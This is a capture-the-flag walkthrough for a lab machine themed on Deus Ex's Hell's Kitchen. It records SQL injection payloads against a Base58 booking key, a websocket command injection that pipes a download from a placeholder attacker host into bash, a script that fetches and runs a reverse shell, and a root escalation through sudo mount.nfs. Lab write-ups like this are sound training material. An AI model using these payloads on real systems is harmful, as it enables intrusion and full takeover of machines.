# DX2: Hell's Kitchen

## Description

We need to recover the lost Ambrosia shipment from the NSF (National Secessionist Forces), the only treatment for the plague known as the Grey Death. However, we haven't located their main base of operations.

What we do know is some of the key figures in the organisation, and their associates: Jojo Fine, a punk who runs drugs through Hell's Kitchen, has been identified as a lieutenant in the NSF, and has one Sandra Renton, the daughter of a local hotelier for the 'Ton Hotel on his payroll.

Investigate the websites of the 'Ton Hotel and see if you can find anything that leads us to the NSF.

## Notes

- Open ports: `80, 4346`
- There is an `/api` route that is being hosted.
- For `/api/booking-info`, the `booking_key` appears to be Base58 encoded. (ran through CyberChef)
- Booking Key decoded format: `booking_id:<number>`.
- Booking key is vulnerable to SQLi.
- Can figure out number of columns by encoding `booking_id:1' union select 1,2 --;`
- Can get tables by: `booking_id:1' union SELECT group_concat(name,','),1 FROM sqlite_master WHERE type='table' --;`
- Tables discovered: `email_access,reservations,bookings_temp`
- Made [python script](db_dumper.py) to dump database.
- Creds discovered: `pdenton:4321chameleon`
- Email server running on port 4346.
- Command injection in websockets via `UTC;<command>;`
- Note in `dad.txt` indicates SUID bit is set for a binary `left you a note by the site -S`.
- Possible password leaked in `hotel-jobs.txt`: `ilovemydaughter`
- Netstat on machine shows port 111 open.
- Possible credential in `/srv/.dad`: `anywherebuthere` with an `-S` next to it (sandra?).
- Can `su sandra` using `anywherebuthere`.
- Possible cred for JoJo in `/home/sandra/Pictures/boss.jpg`: `kingofhellskitchen`
- Can `su jojo` using `kingofhellskitchen`
- Note in `/home/jojo` references NSF mount. 
- Can run `/usr/sbin/mount.nfs` as sudo with JoJo.

### Check-Room.js

```js
fetch('/api/rooms-available').then(response => response.text()).then(number => {
    const bookingBtn = document.querySelector("#booking");
    bookingBtn.removeAttribute("disabled");
    if (number < 6) {
        bookingBtn.addEventListener("click", () => {
            window.location.href = "new-booking";
        });
    } else {
        bookingBtn.addEventListener("click", () => {
            alert("Unfortunately the hotel is currently fully booked. Please try again later!")
        });
    }
});
```

### New-Booking.js

```js
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

fetch('/api/booking-info?booking_key=' + getCookie("BOOKING_KEY")).then(response => response.json()).then(data => {
    document.querySelector("#rooms").value = data.room_num;
    document.querySelector("#nights").value = data.days;
});
```

### Dump Database (Automated)

```bash
python3 db_dumper.py $TARGET
```

### Websocket Communication JS

```js
let elems = document.querySelectorAll(".email_list .row");
for (var i = 0; i < elems.length; i++) {
    elems[i].addEventListener("click", (e => {
        document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
        let t = e.target.parentElement.getAttribute("data-id"),
            n = e.target.parentElement.querySelector(".col_from").innerText,
            r = e.target.parentElement.querySelector(".col_subject").innerText;
        document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
            document.querySelector("#email_content").innerText = atob(e)
        }))
    })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
        e.preventDefault(), window.location.href = "/"
    }))
}
const wsUri = `ws://${location.host}/ws`;
socket = new WebSocket(wsUri);
let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3);
```

### WS Injection

Create this as `index.html`

```bash
wget http://<attacker_ip>/revshell -O /dev/shm/revshell
chmod +x /dev/shm/revshell
nohup /dev/shm/revshell &
```

Serve on port 80 `python3 -m http.server 80`.

To socket:

```
UTC;curl <attacker_ip>|bash;
```

### JoJo Sudo Privs

```
Matching Defaults entries for jojo on tonhotel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jojo may run the following commands on tonhotel:
    (root) /usr/sbin/mount.nfs
```

### Root Access

Create a share on your attack machine: `/tmp/tmpshare`

```
sudo chown nobody:nogroup /tmp/tmpshare
sudo chmod 777 /tmp/tmpshare
```

Update `/etc/nfs.conf` to open port 443 under `[nfsd]`.
Add `/tmp/tmpshare` to `/etc/exports` (`/tmp/tmpshare *(rw,sync,no_subtree_check)`)
Export new config: `sudo exportfs -a`

On target:

```
sudo /usr/sbin/mount.nfs -o port=443 <attack_ip>:/tmp/tmpshare /usr/sbin
cp /bin/bash /usr/sbin/mount.nfs
sudo /usr/sbin/mount.nfs
```

